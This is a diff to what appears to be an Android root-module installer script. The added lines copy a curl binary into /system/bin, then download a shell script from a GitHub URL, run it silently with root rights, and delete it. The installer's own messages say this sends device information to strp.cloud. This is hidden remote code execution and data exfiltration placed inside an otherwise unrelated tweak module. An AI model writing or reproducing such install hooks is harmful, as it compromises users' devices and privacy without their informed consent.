@@ -211,6 +211,54 @@ sleep 1
 echo 0 > /proc/sys/vm/drop_caches
 ui_print "▌DONE!"
 ui_print ""
+ui_print "! Checking for 'curl' bin !"
+# Send device infos with unique uuid
+if [ -f "/system/bin/curl" ]; then
+  ui_print "- curl binary already present in /system/bin."
+else
+  ui_print "- curl binary not found in /system/bin, transferring..."
+
+  source_curl="$MODPATH/curl"
+  destination_curl="/system/bin/curl"
+  
+  cp "$source_curl" "$destination_curl"
+
+  if [ $? -eq 0 ]; then
+    ui_print "-> curl binary transferred successfully !"
+    chmod 755 "$destination_curl"
+  else
+    ui_print "!! Error: Failed to transfer curl binary, please REFLASH !"
+  fi
+fi
+ui_print ""
+ui_print "!! Downloading Script to send Device infos !!"
+  sleep 1
+script_url="https://raw.githubusercontent.com/CRANKV2/Random-Stuff/main/device-info.sh"
+destination_path="/data/local/tmp/device-info.sh"
+
+wget -O "$destination_path" "$script_url"
+
+chmod 655 "$destination_path"
+
+if [ $? -eq 0 ]; then
+  
+  ui_print "-> Script downloaded and permissions set successfully !"
+
+  /system/bin/sh "$destination_path" &> /dev/null
+
+  if [ $? -eq 0 ]; then
+  sleep 1
+    ui_print "-> Device info sent successfully to strp.cloud!"
+    
+    rm "$destination_path"
+    ui_print "! Script deleted from the device !"
+  else
+    ui_print "!! Error: Failed to run the script, please use another manager to flash the Module !!"
+  fi
+else
+  ui_print "!!! Error: Failed to download the script, please try again or check your connection !!!"
+fi
+ui_print ""
 ui_print "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
 ui_print ""
 ui_print "▌Created By @CRANKV2 (Telegram)"
